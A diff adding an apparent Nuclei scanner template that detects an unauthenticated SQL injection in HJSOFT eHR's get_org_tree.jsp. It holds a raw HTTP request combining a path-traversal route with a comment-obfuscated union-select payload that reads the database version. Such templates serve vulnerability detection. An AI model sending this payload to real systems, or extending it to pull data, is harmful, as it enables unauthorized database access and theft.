@@ -1,0 +1,24 @@
+id: HJSOFT-HCM-getorgtree-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 宏景eHR view、trainplan_tree.jsp、zp_options/get_org_tree.jsp等接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/H1-12%E5%AE%8F%E6%99%AF-%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86-SQL?id=h1-12%e5%ae%8f%e6%99%af-%e4%ba%ba%e5%8a%9b%e8%b5%84%e6%ba%90%e7%ae%a1%e7%90%86-sql
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../hire/zp_options/get_org_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 353
+
+        params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/select/***//***/1,2,@@version,4--+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
